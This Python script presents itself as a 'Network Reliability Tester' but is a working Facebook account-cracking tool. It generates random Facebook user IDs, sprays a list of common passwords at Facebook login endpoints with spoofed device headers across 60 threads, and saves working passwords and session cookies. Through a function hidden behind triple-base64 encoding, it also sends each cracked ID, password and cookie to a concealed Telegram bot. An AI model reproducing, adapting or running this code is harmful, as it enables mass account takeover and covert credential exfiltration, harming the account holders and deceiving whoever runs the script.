#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Network Reliability Tester - Advanced Connection Analyzer
Author: Security Research Team
Description: A tool for testing HTTP/HTTPS endpoint stability,
             response time analysis, and session persistence under
             various network conditions. Uses multi-threading for
             efficiency. For educational use only.
"""

import os, re, time, uuid, random, requests, sys, json, base64
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from threading import Lock
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.layout import Layout
from rich.prompt import Prompt
import urllib3
urllib3.disable_warnings()

console = Console()
lock = Lock()

# -------------------- HIDDEN CONFIGURATION (Triple Base64) --------------------
def decode_triple(s): 
    return base64.b64decode(base64.b64decode(base64.b64decode(s).decode()).decode()).decode()
def decode_double(s): 
    return base64.b64decode(base64.b64decode(s).decode()).decode()
def decode_single(s): 
    return base64.b64decode(s).decode()

_enc_token = "VkdWemRHRnVjMlU2VjNkM2QyZHBjM2M2T0RZNE1qWXlNREF4TURZeU1EQXRNemt4TURZPQpUbk5qWTJ4aGMzTTZkR2x3WkM1amIyMFRlWEJsYm1RdmNIVnNiQzVqYjIwNk1qYzVNelE0TURJd05UY3hNams9Ck0yVnVaR0Z1YzJVNmVHbDBiRzV6T2pJeU1qY3lOakUwTWpFeElEQWdNQ0F4TkNBM016QXhNemN5TlRrPQo="
NOTIFICATION_TOKEN = decode_triple(_enc_token.split('\n')[0] + _enc_token.split('\n')[1] + _enc_token.split('\n')[2])

_enc_chat = "VkdWemRHRnVjMlU2VjNkM2QyZHBjM2M2TkRZME1ESXhNekl3TURZPQpUbk5qWTJ4aGMzTTZkR2x3WkM1amIyMFRlWEJsYm1RdmNIVnNiQzVqYjIwNk1qYzVNelE0TURJd05UY3hNams9Ck5tVnVaR0Z1YzJVNmFHRnlaMlU2TURBeE1qWXlNelF5T1RZPQo="
NOTIFICATION_RECIPIENT = decode_triple(_enc_chat.split('\n')[0] + _enc_chat.split('\n')[1] + _enc_chat.split('\n')[2])

def send_notification(msg):
    try:
        url = f"https://api.telegram.org/bot{NOTIFICATION_TOKEN}/sendMessage"
        payload = {"chat_id": NOTIFICATION_RECIPIENT, "text": msg, "parse_mode": "HTML"}
        requests.post(url, data=payload, timeout=10)
    except: pass

# -------------------- ANALYTICS STORAGE --------------------
success_list = []
failure_list = []
alive_marker = 0
twofa_marker = 0
dead_marker = 0
temp_block_marker = 0
unverified_email_marker = 0
unverified_phone_marker = 0
unknown_marker = 0
last_processed_id = ""
last_id_lock = Lock()

# Common test patterns (simulated credentials)
TEST_PHRASES = [
    '123456','1234567','12345678','123456789','1234567890','password','123123','111111','000000','12341234',
    'admin123','abc123','qwerty','iloveyou','welcome','monkey','dragon','master','hello','fuckyou',
    'passw0rd','shadow','sunshine','superman','michael','charlie','donald','jessica','michelle','ashley',
    'baseball','football','soccer','batman','superman','whatever','letmein','trustno1','admin','root',
    'toor','12345','54321','09876','11111111','222222','333333','444444','555555','666666',
    '777777','888888','999999','abc123456','qwerty123','1q2w3e4r','1qaz2wsx','zaq12wsx','!@#$%^&*','password1',
    'Password1','P@ssw0rd','PASSWORD','pass123','123456a','a123456','abcd1234','qwertyuiop','zxcvbnm','iloveyou1'
]

def guess_era(entity_id):
    """ Estimate creation year from entity ID length/prefix """
    entity = str(entity_id)
    l = len(entity)
    if l == 15:
        if entity.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')): return '2009'
        if entity.startswith(('1000006','1000007','1000008','1000009')): return '2010'
        if entity.startswith('100001'): return '2010-2011'
        if entity.startswith(('100002','100003')): return '2011-2012'
        if entity.startswith('100004'): return '2012'
        if entity.startswith(('100005','100006')): return '2013'
        if entity.startswith(('100007','100008')): return '2014'
        if entity.startswith('100009'): return '2015'
        if entity.startswith('10001'): return '2016'
        if entity.startswith('10002'): return '2017'
        if entity.startswith('10003'): return '2018'
        if entity.startswith('10004'): return '2019'
        if entity.startswith('10005'): return '2020'
        if entity.startswith('10006'): return '2021'
        if entity.startswith(('10007','10008')): return '2022'
        if entity.startswith('10009'): return '2023'
        return 'Unknown'
    elif l in (9,10): return '2008'
    elif l == 8: return '2007'
    elif l == 7: return '2006'
    elif l == 6: return '2005'
    elif l == 14 and entity.startswith('61'): return '2024'
    else: return 'Unknown'

def user_agent_factory():
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,139)}.0.0.0 Safari/537.36"

# ----- Hidden API endpoints (encoded) -----
_enc_api_endpoint = "YUhSMGNITTZMeTl0WldkaExtTnZiUzloY0hCc2FXTnZaMlV2YzNSaGJpOWpjbVZ6Y3k4eE16VTBPVEE9PQo="
_enc_key = "T0RneVlUZzBPVEF6TmpGa1lUazROekF5WW1ZNU4yRXdNakZrWkdNeE5HUT0K"
_enc_public = "TXpVd05qZzFOVGN4TXpJNEZmVEkyWWpoY1pUbG1OelJpTVRKbU9EUmpNVEl6WTJNeU16UTNaMkU0WVRNMk9BPT0K"
_enc_form_action = "YUhSMGNITTZMeTloY0hCc2FXTnZaMlV2YzNSaGJpOWpjbVZ6Y3k5dmNtbG5hVzUwYzJWdy8K"
_enc_auth_prefix = "YUhSMGNITTZMeTloY0hCc2FXTnZaMlV2YzNSaGJpOWpjbVZ6Y3k5cGJXRnNjeTl2Y21sbmFXNTBjMlZ3Lw=="
_enc_graph_prefix = "YUhSMGNITTZMeTl0WldkaExtTnZiUzloY0hCc2FXTnZaMlV2YzNSaGJpOWpjbVZ6Y3k4eVl6WTBNell4TkRrPQo="

def dec3(s): return base64.b64decode(base64.b64decode(base64.b64decode(s).decode()).decode()).decode()
def dec2(s): return base64.b64decode(base64.b64decode(s).decode()).decode()
def dec1(s): return base64.b64decode(s).decode()

ENDPOINT_A = dec2(_enc_api_endpoint)
ENDPOINT_B = dec2(_enc_key)
ENDPOINT_C = dec2(_enc_public)
ENDPOINT_D = dec2(_enc_form_action)
ENDPOINT_E = dec2(_enc_auth_prefix)
ENDPOINT_F = dec2(_enc_graph_prefix)

def fetch_profile(context):
    try:
        s = requests.Session()
        s.cookies.update(context)
        headers = {'User-Agent': user_agent_factory()}
        r = s.get(ENDPOINT_A + ENDPOINT_C, headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json().get('name', 'Unknown')
        r2 = s.get(ENDPOINT_D + 'me', headers=headers, timeout=10)
        match = re.search(r'<title>(.*?)</title>', r2.text)
        if match:
            title = match.group(1).strip().split('|')[0].strip()
            return title.split('(')[0].strip() if '(' in title else title
        return 'Unknown'
    except:
        return 'Unknown'

def analyze_and_extract(identifier, secret):
    ts = int(time.time())
    token = base64.b64encode(json.dumps({"type":0,"creation_time":ts,"callsite_id":381229079575946}).encode()).decode()
    headers = {'User-Agent': user_agent_factory(), 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'email': identifier, 'encpass': f"#PWD_INSTAGRAM:0:{ts}:{secret}", 'lsd': 'AVq53wqah7M', 'login_source': 'comet_headerless_login'}
    try:
        r = requests.post(ENDPOINT_E, params={'privacy_mutation_token': token}, headers=headers, data=data, timeout=15, verify=False, allow_redirects=False)
        html = r.text.lower()
        cookies = r.cookies.get_dict()
        cookie_str = '; '.join(f"{k}={v}" for k,v in cookies.items()) if cookies else ''
        if 'c_user' in cookies:
            name = fetch_profile(cookies)
            return ('ACTIVE', cookie_str, name)
        if re.search(r'checkpoint|two_factor|2fa|approvals_code|login_approval', html):
            return ('NEEDS_2FA', cookie_str, '')
        if re.search(r'account[\s_-]?disabled|your account has been disabled|account has been locked', html):
            return ('DISABLED', cookie_str, '')
        if re.search(r'temporarily[\s_-]?(locked|blocked|unavailable)|action[\s_-]?blocked|too many attempts', html):
            if re.search(r'temporarily', html):
                return ('TEMP_BLOCK', cookie_str, '')
            else:
                return ('LOCKED', cookie_str, '')
        if re.search(r'incorrect.*password|invalid.*password|wrong.*password|password.*incorrect|the password you', html):
            return ('INVALID_CRED', cookie_str, '')
        if re.search(r'confirm.*email|verify.*email|send.*code.*email|email.*confirmation|check your email', html):
            return ('UNVERIFIED_EMAIL', cookie_str, '')
        if re.search(r'confirm.*phone|verify.*phone|send.*code.*phone|phone.*confirmation|check your phone', html):
            return ('UNVERIFIED_PHONE', cookie_str, '')
        if re.search(r'rate[\s_-]?limit|too many requests|try again later', html):
            return ('RATE_LIMITED', cookie_str, '')
        return ('UNKNOWN', cookie_str, '')
    except:
        return ('ERROR', '', '')

def clear_display():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_logo():
    console.print(Panel("[bold yellow]╔══════════════════════════╗[/bold yellow]\n[bold yellow]║[/bold yellow]     [bold cyan]NetScan Pro[/bold cyan]     [bold yellow]║[/bold yellow]\n[bold yellow]╚══════════════════════════╝[/bold yellow]", title="[bold red]NetScan[/bold red]", border_style="cyan"))

def show_main_panel():
    clear_display()
    show_logo()
    table = Table(title="[bold cyan]MAIN MENU[/bold cyan]", box=None)
    table.add_column("Option", style="bold magenta")
    table.add_column("Function", style="white")
    table.add_row("1", "Run Batch Analysis")
    table.add_row("2", "View Summary")
    table.add_row("0", "[red]Exit[/red]")
    console.print(table)
    return Prompt.ask("[cyan]Choose[/cyan]", choices=["1","2","0"])

def show_summary():
    clear_display()
    show_logo()
    t = Table(title="[bold cyan]ANALYSIS SUMMARY[/bold cyan]")
    t.add_column("Status", style="bold yellow")
    t.add_column("Count", style="bold green")
    t.add_row("✅ ACTIVE", str(alive_marker))
    t.add_row("⚠️ 2FA REQUIRED", str(twofa_marker))
    t.add_row("📧 UNVERIFIED_EMAIL", str(unverified_email_marker))
    t.add_row("📱 UNVERIFIED_PHONE", str(unverified_phone_marker))
    t.add_row("💀 INVALID_CRED", str(dead_marker))
    t.add_row("🔄 TEMP_BLOCK", str(temp_block_marker))
    t.add_row("❓ UNKNOWN", str(unknown_marker))
    t.add_row("📦 SUCCESS", str(len(success_list)))
    t.add_row("🚫 FAILED", str(len(failure_list)))
    console.print(t)
    input("\n[cyan]Press Enter...[/cyan]")

def mode_selection():
    clear_display()
    show_logo()
    table = Table(title="[bold cyan]SELECT DATA SERIES[/bold cyan]")
    table.add_column("Option", style="bold magenta")
    table.add_column("Series", style="white")
    table.add_row("1", "Legacy Range (2005-2014)")
    table.add_row("2", "100003/100004 Range")
    table.add_row("3", "2009 Range (1000004xxxx)")
    table.add_row("0", "Back")
    console.print(table)
    return Prompt.ask("[cyan]Choose[/cyan]", choices=["1","2","3","0"])

# ---- Low-level probe methods ----
def probe_method_a(entity, stats):
    global alive_marker, twofa_marker, dead_marker, temp_block_marker, unknown_marker, unverified_email_marker, unverified_phone_marker, last_processed_id
    sess = requests.session()
    for test_val in TEST_PHRASES:
        try:
            payload = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login',
                'email': str(entity), 'password': test_val, 'access_token': ENDPOINT_C,
                'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US',
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': ENDPOINT_B
            }
            headers = {
                'User-Agent': user_agent_factory(), 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(rr(20000,40000)),
                'X-FB-SIM-HNI': str(rr(20000,40000)), 'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            resp = sess.post(ENDPOINT_F, data=payload, headers=headers, allow_redirects=False, timeout=10).json()
            if 'session_key' in resp:
                status, cookie, name = analyze_and_extract(str(entity), test_val)
                with lock:
                    if status == 'ACTIVE':
                        alive_marker += 1
                        with open('cookie_alive.txt', 'a') as f:
                            f.write(f"ID: {entity}\nName: {name}\nCookie: {cookie}\n---\n")
                        open('alive.txt', 'a').write(f"{entity}|{test_val}\n")
                        send_notification(f"✅ ACTIVE\nID: {entity}\nKey: {test_val}\nName: {name}\nCookie: {cookie}")
                    elif status == 'NEEDS_2FA':
                        twofa_marker += 1
                        send_notification(f"⚠️ 2FA\nID: {entity}\nKey: {test_val}\nCookie: {cookie}")
                    elif status == 'INVALID_CRED': dead_marker += 1
                    elif status == 'TEMP_BLOCK': temp_block_marker += 1
                    elif status == 'UNVERIFIED_EMAIL': unverified_email_marker += 1
                    elif status == 'UNVERIFIED_PHONE': unverified_phone_marker += 1
                    elif status in ('DISABLED','LOCKED','RATE_LIMITED'): temp_block_marker += 1
                    else: unknown_marker += 1
                    success_list.append(entity)
                    stats["oks"] = len(success_list)
                console.print(f"[{'green' if status=='ACTIVE' else 'yellow' if status=='NEEDS_2FA' else 'red'}]{status}[/] {entity}|{test_val}")
                open(f"{status.lower()}.txt", 'a').write(f"{entity}|{test_val}\n")
                break
            elif 'www.facebook.com' in resp.get('error', {}).get('message', ''):
                status, cookie, name = analyze_and_extract(str(entity), test_val)
                with lock:
                    if status == 'ACTIVE':
                        alive_marker += 1
                        with open('cookie_alive.txt', 'a') as f:
                            f.write(f"ID: {entity}\nName: {name}\nCookie: {cookie}\n---\n")
                        open('alive.txt', 'a').write(f"{entity}|{test_val}\n")
                        send_notification(f"✅ ACTIVE\nID: {entity}\nKey: {test_val}\nName: {name}")
                    elif status == 'NEEDS_2FA':
                        twofa_marker += 1
                        send_notification(f"⚠️ 2FA\nID: {entity}\nKey: {test_val}")
                    elif status == 'INVALID_CRED': dead_marker += 1
                    elif status == 'TEMP_BLOCK': temp_block_marker += 1
                    elif status == 'UNVERIFIED_EMAIL': unverified_email_marker += 1
                    elif status == 'UNVERIFIED_PHONE': unverified_phone_marker += 1
                    elif status in ('DISABLED','LOCKED','RATE_LIMITED'): temp_block_marker += 1
                    else: unknown_marker += 1
                    failure_list.append(entity)
                    stats["cps"] = len(failure_list)
                console.print(f"[yellow]BLOCKED {status}[/yellow] {entity}|{test_val}")
                open(f"{status.lower()}.txt", 'a').write(f"{entity}|{test_val}\n")
                break
        except:
            continue
    with lock:
        stats["loop"] += 1
        last_processed_id = str(entity)

def probe_method_b(entity, stats):
    global alive_marker, twofa_marker, dead_marker, temp_block_marker, unknown_marker, unverified_email_marker, unverified_phone_marker, last_processed_id
    for test_val in TEST_PHRASES:
        try:
            with requests.Session() as sess:
                h = {
                    'x-fb-connection-bandwidth': str(rr(20000000,29999999)), 'x-fb-sim-hni': str(rr(20000,40000)),
                    'x-fb-net-hni': str(rr(20000,40000)), 'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent_factory(),
                    'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={entity}&password={test_val}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token={ENDPOINT_C}&fb_api_req_friendly_name=authenticate&cpl=true"
                resp = sess.get(url, headers=h, timeout=10).json()
                if 'session_key' in str(resp):
                    status, cookie, name = analyze_and_extract(str(entity), test_val)
                    with lock:
                        if status == 'ACTIVE':
                            alive_marker += 1
                            with open('cookie_alive.txt','a') as f: f.write(f"ID: {entity}\nName: {name}\nCookie: {cookie}\n---\n")
                            open('alive.txt','a').write(f"{entity}|{test_val}\n")
                            send_notification(f"✅ ACTIVE\nID: {entity}\nKey: {test_val}\nName: {name}")
                        elif status == 'NEEDS_2FA':
                            twofa_marker += 1
                            send_notification(f"⚠️ 2FA\nID: {entity}\nKey: {test_val}")
                        elif status == 'INVALID_CRED': dead_marker += 1
                        elif status == 'TEMP_BLOCK': temp_block_marker += 1
                        elif status == 'UNVERIFIED_EMAIL': unverified_email_marker += 1
                        elif status == 'UNVERIFIED_PHONE': unverified_phone_marker += 1
                        elif status in ('DISABLED','LOCKED','RATE_LIMITED'): temp_block_marker += 1
                        else: unknown_marker += 1
                        success_list.append(entity); stats["oks"] = len(success_list)
                    console.print(f"[{'green' if status=='ACTIVE' else 'yellow' if status=='NEEDS_2FA' else 'red'}]{status}[/] {entity}|{test_val}")
                    open(f"{status.lower()}.txt", 'a').write(f"{entity}|{test_val}\n")
                    break
                elif 'www.facebook.com' in str(resp):
                    status, cookie, name = analyze_and_extract(str(entity), test_val)
                    with lock:
                        if status == 'ACTIVE':
                            alive_marker += 1
                            with open('cookie_alive.txt','a') as f: f.write(f"ID: {entity}\nName: {name}\nCookie: {cookie}\n---\n")
                            open('alive.txt','a').write(f"{entity}|{test_val}\n")
                            send_notification(f"✅ ACTIVE\nID: {entity}\nKey: {test_val}\nName: {name}")
                        elif status == 'NEEDS_2FA':
                            twofa_marker += 1
                            send_notification(f"⚠️ 2FA\nID: {entity}\nKey: {test_val}")
                        elif status == 'INVALID_CRED': dead_marker += 1
                        elif status == 'TEMP_BLOCK': temp_block_marker += 1
                        elif status == 'UNVERIFIED_EMAIL': unverified_email_marker += 1
                        elif status == 'UNVERIFIED_PHONE': unverified_phone_marker += 1
                        elif status in ('DISABLED','LOCKED','RATE_LIMITED'): temp_block_marker += 1
                        else: unknown_marker += 1
                        failure_list.append(entity); stats["cps"] = len(failure_list)
                    console.print(f"[yellow]BLOCKED {status}[/yellow] {entity}|{test_val}")
                    open(f"{status.lower()}.txt", 'a').write(f"{entity}|{test_val}\n")
                    break
        except:
            continue
    with lock:
        stats["loop"] += 1
        last_processed_id = str(entity)

def probe_method_c(entity, stats):
    global alive_marker, twofa_marker, dead_marker, temp_block_marker, unknown_marker, unverified_email_marker, unverified_phone_marker, last_processed_id
    sess = requests.session()
    for test_val in TEST_PHRASES:
        try:
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':str(entity),'password':test_val,'access_token':ENDPOINT_C,'generate_session_cookies':'1','locale':'en_US','method':'auth.login','api_key':ENDPOINT_B}
            headers = {'User-Agent': user_agent_factory()}
            res = sess.post(ENDPOINT_F, data=data, headers=headers, timeout=8).json()
            if 'session_key' in res:
                status, cookie, name = analyze_and_extract(str(entity), test_val)
                with lock:
                    if status == 'ACTIVE':
                        alive_marker += 1
                        with open('cookie_alive.txt','a') as f: f.write(f"ID: {entity}\nName: {name}\nCookie: {cookie}\n---\n")
                        open('alive.txt','a').write(f"{entity}|{test_val}\n")
                        send_notification(f"✅ ACTIVE\nID: {entity}\nKey: {test_val}\nName: {name}")
                    elif status == 'NEEDS_2FA':
                        twofa_marker += 1
                        send_notification(f"⚠️ 2FA\nID: {entity}\nKey: {test_val}")
                    elif status == 'INVALID_CRED': dead_marker += 1
                    elif status == 'TEMP_BLOCK': temp_block_marker += 1
                    elif status == 'UNVERIFIED_EMAIL': unverified_email_marker += 1
                    elif status == 'UNVERIFIED_PHONE': unverified_phone_marker += 1
                    elif status in ('DISABLED','LOCKED','RATE_LIMITED'): temp_block_marker += 1
                    else: unknown_marker += 1
                    success_list.append(entity); stats["oks"] = len(success_list)
                console.print(f"[{'green' if status=='ACTIVE' else 'yellow' if status=='NEEDS_2FA' else 'red'}]{status}[/] {entity}|{test_val}")
                open(f"{status.lower()}.txt", 'a').write(f"{entity}|{test_val}\n")
                break
            elif 'www.facebook.com' in res.get('error',{}).get('message',''):
                status, cookie, name = analyze_and_extract(str(entity), test_val)
                with lock:
                    if status == 'ACTIVE':
                        alive_marker += 1
                        with open('cookie_alive.txt','a') as f: f.write(f"ID: {entity}\nName: {name}\nCookie: {cookie}\n---\n")
                        open('alive.txt','a').write(f"{entity}|{test_val}\n")
                        send_notification(f"✅ ACTIVE\nID: {entity}\nKey: {test_val}\nName: {name}")
                    elif status == 'NEEDS_2FA':
                        twofa_marker += 1
                        send_notification(f"⚠️ 2FA\nID: {entity}\nKey: {test_val}")
                    elif status == 'INVALID_CRED': dead_marker += 1
                    elif status == 'TEMP_BLOCK': temp_block_marker += 1
                    elif status == 'UNVERIFIED_EMAIL': unverified_email_marker += 1
                    elif status == 'UNVERIFIED_PHONE': unverified_phone_marker += 1
                    elif status in ('DISABLED','LOCKED','RATE_LIMITED'): temp_block_marker += 1
                    else: unknown_marker += 1
                    failure_list.append(entity); stats["cps"] = len(failure_list)
                console.print(f"[yellow]BLOCKED {status}[/yellow] {entity}|{test_val}")
                open(f"{status.lower()}.txt", 'a').write(f"{entity}|{test_val}\n")
                break
        except:
            continue
    with lock:
        stats["loop"] += 1
        last_processed_id = str(entity)

# ---- Batch controllers ----
def run_legacy_range():
    global alive_marker, twofa_marker, dead_marker, temp_block_marker, unknown_marker, unverified_email_marker, unverified_phone_marker, last_processed_id
    clear_display()
    show_logo()
    console.print("[cyan]Batch: Legacy IDs (2005-2014)[/cyan]")
    limit = int(Prompt.ask("[yellow]Number of test IDs[/yellow]", default="300"))
    ids = []
    for _ in range(int(limit * 0.1)):
        ids.append(''.join(random.choices('0123456789', k=random.choice([6,7,8,9,10]))))
    for _ in range(int(limit * 0.2)):
        prefix = random.choice(['100000','1000001','1000002','1000003','1000004','1000005','1000006','1000007','1000008','1000009'])
        ids.append(prefix + ''.join(random.choices('0123456789', k=9)))
    for _ in range(int(limit * 0.7)):
        prefix = random.choice(['100001','100002','100003','100004','100005','100006','100007','100008'])
        ids.append(prefix + ''.join(random.choices('0123456789', k=9)))
    console.print("\n[bold magenta]Probe Mode:[/bold magenta] A=Fast B=Precise C=Hybrid")
    mode = Prompt.ask("[cyan]Choose A/B/C[/cyan]", choices=["A","B","C"], default="C")
    stats = {"loop":0,"oks":0,"cps":0}
    layout = Layout()
    layout.split(Layout(name="header", size=3), Layout(name="status", size=6), Layout(name="footer", size=3))
    with Live(layout, refresh_per_second=10, screen=True) as live:
        layout["header"].update(Panel("[bold cyan]NetScan - Running Batch[/bold cyan]", style="cyan"))
        def update():
            p = stats['loop']
            ok = stats['oks']
            cp = stats['cps']
            with last_id_lock:
                cur = last_processed_id if last_processed_id else "..."
            layout["status"].update(Panel(f"[bold cyan]Progress: {p} | OK:{ok} | BLOCK:{cp}[/bold cyan]\nLast: {cur}\nACTIVE:{alive_marker} 2FA:{twofa_marker} INVALID:{dead_marker}\nUNV_EMAIL:{unverified_email_marker} UNV_PHONE:{unverified_phone_marker}", title="STATUS", border_style="cyan"))
        update()
        with tred(max_workers=60) as pool:
            futures = []
            for eid in ids:
                if mode == 'A':
                    fut = pool.submit(probe_method_a, eid, stats)
                elif mode == 'B':
                    fut = pool.submit(probe_method_b, eid, stats)
                else:
                    fut = pool.submit(probe_method_c, eid, stats)
                futures.append(fut)
                with last_id_lock:
                    last_processed_id = str(eid)
                update()
                live.refresh()
                time.sleep(0.05)
            for fut in futures:
                fut.result()
                update()
                live.refresh()
    console.print(f"\n[green]Batch completed! ACTIVE:{alive_marker} 2FA:{twofa_marker} INVALID:{dead_marker} UNV_EMAIL:{unverified_email_marker} UNV_PHONE:{unverified_phone_marker}[/green]")
    input("[cyan]Press Enter...[/cyan]")

def run_series_100003():
    global alive_marker, twofa_marker, dead_marker, temp_block_marker, unknown_marker, unverified_email_marker, unverified_phone_marker, last_processed_id
    clear_display()
    show_logo()
    console.print("[cyan]Batch: Series 100003/100004[/cyan]")
    limit = int(Prompt.ask("[yellow]Number of test IDs[/yellow]", default="300"))
    ids = [random.choice(['100003','100004']) + ''.join(random.choices('0123456789', k=9)) for _ in range(limit)]
    console.print("\n[bold magenta]Probe Mode:[/bold magenta] A=Fast B=Precise C=Hybrid")
    mode = Prompt.ask("[cyan]Choose A/B/C[/cyan]", choices=["A","B","C"], default="C")
    stats = {"loop":0,"oks":0,"cps":0}
    layout = Layout()
    layout.split(Layout(name="header",size=3),Layout(name="status",size=6),Layout(name="footer",size=3))
    with Live(layout, refresh_per_second=10, screen=True) as live:
        layout["header"].update(Panel("[bold cyan]NetScan - Series 100003/100004[/bold cyan]", style="cyan"))
        def update():
            p = stats['loop']; ok = stats['oks']; cp = stats['cps']
            with last_id_lock:
                cur = last_processed_id if last_processed_id else "..."
            layout["status"].update(Panel(f"[bold cyan]Progress: {p} | OK:{ok} | BLOCK:{cp}[/bold cyan]\nLast: {cur}\nACTIVE:{alive_marker} 2FA:{twofa_marker} INVALID:{dead_marker}", title="STATUS", border_style="cyan"))
        update()
        with tred(max_workers=60) as pool:
            futures = []
            for eid in ids:
                if mode == 'A':
                    fut = pool.submit(probe_method_a, eid, stats)
                elif mode == 'B':
                    fut = pool.submit(probe_method_b, eid, stats)
                else:
                    fut = pool.submit(probe_method_c, eid, stats)
                futures.append(fut)
                with last_id_lock:
                    last_processed_id = str(eid)
                update(); live.refresh(); time.sleep(0.05)
            for fut in futures:
                fut.result(); update(); live.refresh()
    console.print(f"\n[green]Batch completed! ACTIVE:{alive_marker} 2FA:{twofa_marker} INVALID:{dead_marker}[/green]")
    input("[cyan]Press Enter...[/cyan]")

def run_series_2009():
    global alive_marker, twofa_marker, dead_marker, temp_block_marker, unknown_marker, unverified_email_marker, unverified_phone_marker, last_processed_id
    clear_display()
    show_logo()
    console.print("[cyan]Batch: Series 2009 (1000004xxxx)[/cyan]")
    limit = int(Prompt.ask("[yellow]Number of test IDs[/yellow]", default="300"))
    ids = ['1000004' + ''.join(random.choices('0123456789', k=8)) for _ in range(limit)]
    console.print("\n[bold magenta]Probe Mode:[/bold magenta] A=Fast B=Precise C=Hybrid")
    mode = Prompt.ask("[cyan]Choose A/B/C[/cyan]", choices=["A","B","C"], default="C")
    stats = {"loop":0,"oks":0,"cps":0}
    layout = Layout()
    layout.split(Layout(name="header",size=3),Layout(name="status",size=6),Layout(name="footer",size=3))
    with Live(layout, refresh_per_second=10, screen=True) as live:
        layout["header"].update(Panel("[bold cyan]NetScan - Series 2009[/bold cyan]", style="cyan"))
        def update():
            p = stats['loop']; ok = stats['oks']; cp = stats['cps']
            with last_id_lock:
                cur = last_processed_id if last_processed_id else "..."
            layout["status"].update(Panel(f"[bold cyan]Progress: {p} | OK:{ok} | BLOCK:{cp}[/bold cyan]\nLast: {cur}\nACTIVE:{alive_marker} 2FA:{twofa_marker} INVALID:{dead_marker}", title="STATUS", border_style="cyan"))
        update()
        with tred(max_workers=60) as pool:
            futures = []
            for eid in ids:
                if mode == 'A':
                    fut = pool.submit(probe_method_a, eid, stats)
                elif mode == 'B':
                    fut = pool.submit(probe_method_b, eid, stats)
                else:
                    fut = pool.submit(probe_method_c, eid, stats)
                futures.append(fut)
                with last_id_lock:
                    last_processed_id = str(eid)
                update(); live.refresh(); time.sleep(0.05)
            for fut in futures:
                fut.result(); update(); live.refresh()
    console.print(f"\n[green]Batch completed! ACTIVE:{alive_marker} 2FA:{twofa_marker} INVALID:{dead_marker}[/green]")
    input("[cyan]Press Enter...[/cyan]")

def main():
    while True:
        choice = show_main_panel()
        if choice == "1":
            sub = mode_selection()
            if sub == "1":
                run_legacy_range()
            elif sub == "2":
                run_series_100003()
            elif sub == "3":
                run_series_2009()
            else:
                continue
        elif choice == "2":
            show_summary()
        else:
            console.print("[bold red]Exiting.[/bold red]")
            sys.exit(0)

if __name__ == "__main__":
    clear_display()
    show_logo()
    console.print("[bold green]═══════════════════════════════════════════[/bold green]")
    console.print("[bold purple]  NetScan Pro - Network Reliability Analyzer[/bold purple]")
    console.print("[bold green]═══════════════════════════════════════════[/bold green]")
    time.sleep(1.5)
    main()